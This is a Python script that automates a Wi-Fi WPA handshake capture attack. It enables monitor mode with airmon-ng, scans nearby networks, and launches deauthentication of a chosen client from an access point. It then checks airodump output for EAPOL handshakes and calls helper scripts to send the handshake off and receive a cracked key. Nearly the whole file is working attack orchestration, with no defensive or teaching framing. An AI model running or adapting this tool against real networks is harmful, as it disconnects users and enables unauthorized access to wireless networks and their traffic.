#!/usr/bin/python
from os import remove
from time import sleep
from glob import  glob
import re
import queue
import threading 
import subprocess

# On system imports.
import networkParsing

# The parent process (this program) should be run with root priveleges, so these processes will inheret that.


def getNetworks():
    networks = []
    subprocess.run(['airmon-ng', 'start', 'wlan1'])
    subprocess.Popen(['./scanner'])
    # Wait for CSV to appear.
    sleep(26)
    networks = networkParsing.parseCSV('networkScan-01.csv')

    # Remove files containing scan info.
    for outputFile in glob('networkScan-*'):
        remove(outputFile)
    return networks


def deAuth_thread(apMAC, clientMAC):
    # Wait for airmon to start.
    sleep(3)
    subprocess.Popen(['./deAuth', apMAC, clientMAC])


def airmon_thread(apName, apChannel):
    subprocess.Popen(['./capture', apChannel, apName])

def checkForCapture():
    result = False
    with open('airodumpOutTail.txt', 'r') as file:
        content = file.readlines()
        for line in content:
            if re.search('EAPOL', line) or re.search('handshake', line):
                # Handshake capture made.
                result = True
                break
    #remove('airodumpOutTail.txt')
    remove('airodumpOut.txt')
    #DEBUG
    #for outputFile in glob('handshake-*'):
    #    remove(outputFile)
    return result



def captureHandshake(apMAC, clientMAC, apChannel, apName):
    monitorNetwork = threading.Thread(target=airmon_thread, args=(apName, apChannel))
    deAuth = threading.Thread(target=deAuth_thread, args=(apMAC, clientMAC))
    monitorNetwork.start()
    deAuth.start()
    sleep(33)
    # Check for capture file every three seconds.
    if checkForCapture():
        return True
    else:
        return False


def sendHandshake():
    process = subprocess.Popen(['./sendHandshake'])
    return process.returncode


def receiveKey():
    process = subprocess.Popen(['./receiveKey'])
    return process.returncode

def moveToFile(variable, savedFile):
    subprocess.Popen(['./moveToFile', variable, savedFile])


